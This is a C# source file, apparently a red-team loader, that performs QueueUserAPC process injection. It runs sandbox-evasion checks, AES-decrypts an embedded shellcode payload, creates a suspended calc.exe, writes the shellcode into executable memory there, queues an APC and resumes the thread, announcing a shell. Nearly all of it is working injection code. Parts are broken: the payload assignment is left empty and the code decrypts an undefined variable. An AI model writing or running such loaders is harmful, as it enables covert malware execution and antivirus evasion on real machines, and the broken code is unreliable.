using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace QUserAPCProcessInjection
{
    class Program
    {
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
			// A handle to the newly created process. The handle is used to specify the process in all functions that perform operations on the process object.
			public IntPtr hProcess;
			// A handle to the primary thread of the newly created process. The handle is used to specify the thread in all functions that perform operations on the thread object.
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}
		
		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200),
			THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
			THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		
		//https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool CreateProcess(
				   string lpApplicationName,
				   string lpCommandLine,
				   IntPtr lpProcessAttributes,
				   IntPtr lpThreadAttributes,
				   bool bInheritHandles,
				   ProcessCreationFlags dwCreationFlags,
				   IntPtr lpEnvironment,
				   string lpCurrentDirectory,
				   ref STARTUPINFO lpStartupInfo, 
				   out PROCESS_INFORMATION lpProcessInformation);
		
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(
					ThreadAccess dwDesiredAccess, 		
					bool bInheritHandle,
					int dwThreadId);
		
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
				
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
		[DllImport("kernel32.dll")]
		private static extern UInt32 QueueUserAPC(
					IntPtr pfnAPC,
					IntPtr hThread,
					IntPtr dwData);
					
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
		
		static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

			Console.WriteLine("[+] Delay of three seconds for scan bypass check");
			
			DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
				return;
            }
			
			
			Console.WriteLine("[+] Decrypt Shellcode");
			
			byte[] Key = Convert.FromBase64String("XtBV14SUmTz+fYzcsd9JSUjY3sJH1jLlNYWi/PyZcp4=");
      			byte[] IV = Convert.FromBase64String("hFh+shqT/Kvbvw8dI2WCIA==");

			// This shellcode byte is the encrypted output from AESencryptor
			byte[] AESshellcode = //encrypted AES payload

			Console.WriteLine("[+]Reversing an reversed array");

			Array.Reverse(xorshellcode);


			byte[] shellcode = Decrypt(xorshellcode, Key , IV);

			StringBuilder hexcodes = new StringBuilder(shellcode.Length * 2);
		    foreach (byte b in shellcode)
		    {
		        hexcodes.AppendFormat("0x{0:x2},",b);
		    }

      		//Console.WriteLine(hexcodes.ToString().Substring(0,hexcodes.Length - 1));

            
			// Store the shellcode as a variable
			//var shellcode = shellcode;
			
			System.Threading.Thread.Sleep(3000);
			
            string processPath = @"C:\Windows\System32\calc.exe";
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			Console.WriteLine("[+] Opening notepad.exe in the background");
			// Creates the process suspended. ProcessCreationFlags.CREATE_SUSPENDED = 0x00000004
			CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
			
			// Sets an integer pointer as a variable reference for the memory space to be allocated for the shellcode
			IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
			
			Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { alloc.ToString("X") });
			// Writes the shellcode into the created memory space
			WriteProcessMemory(pi.hProcess, alloc, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten);
			
			Console.WriteLine("[+] OpenThread to 0x{0}", new string[] { alloc.ToString("X") });
			//ThreadAccess.SET_CONTEXT = 0x0010
			IntPtr tpointer = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
			
			Console.WriteLine("[+] VirtualProtectEx on 0x{0}", new string[] { alloc.ToString("X") });
			// Changes the protection rights to the memory space allocated for the shellcode
			VirtualProtectEx(pi.hProcess, alloc, shellcode.Length, 0x20, out oldProtect);
			
			Console.WriteLine("[+] Setting QueueUserAPC to 0x{0}", new string[] { alloc.ToString("X") });
			// Adds a user-mode asynchronous procedure call (APC) object to the APC queue of the specified thread tpointer
			QueueUserAPC(alloc, tpointer, IntPtr.Zero);
			
            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { pi.hThread.ToString("X") });
            // Resume the suspended calculator.exe thread
            ResumeThread(pi.hThread);
			
			Console.WriteLine("[+] Enjoy your shell from notepad");
			
			System.Threading.Thread.Sleep(3000);
		}
			// AES DECRYPTION

		private static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
		{
		  using (var aes = Aes.Create())
		  {
		    aes.KeySize = 256;
		    aes.BlockSize = 128;
		    aes.Padding = PaddingMode.PKCS7;
		    aes.Mode= CipherMode.CBC;

		    aes.Key = key;
		    aes.IV = iv;

		    using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
		    {
		        return PerformCryptography(data, decryptor);
		    }
		  }
		}

	  	private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
	  	{
	      using (var ms = new MemoryStream())
	      using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
	      {
	          cryptoStream.Write(data, 0, data.Length);
	          cryptoStream.FlushFinalBlock();

	          return ms.ToArray();
	      }
	  	}		


	}
}